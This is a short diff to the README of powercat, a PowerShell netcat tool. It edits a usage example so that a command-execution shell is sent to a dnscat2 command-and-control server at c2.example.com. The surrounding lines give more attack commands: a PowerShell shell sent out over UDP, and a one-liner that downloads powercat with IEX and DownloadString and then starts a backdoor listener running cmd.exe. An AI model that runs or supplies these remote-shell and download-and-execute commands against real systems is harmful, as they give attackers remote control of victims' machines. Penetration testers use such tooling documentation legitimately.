@@ -50,7 +50,7 @@ Netcat: The powershell version. (Powershell Version 2 and Later Supported)
     Send a powershell shell out over UDP:
         powercat -c 10.1.1.16 -p 8000 -u -ep
     Send a shell to the dnscat2 server at c2.example.com, sending queries to 10.1.1.1
-        powercat -c 10.1.1.1 -p 53 -dns c2.example.com
+        powercat -c 10.1.1.1 -p 53 -dns c2.example.com -e cmd
 ### Misc Examples:
     Download and Execute Powercat Backdoor Listener One-Liner:
         powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l 8000 -e cmd.exe"
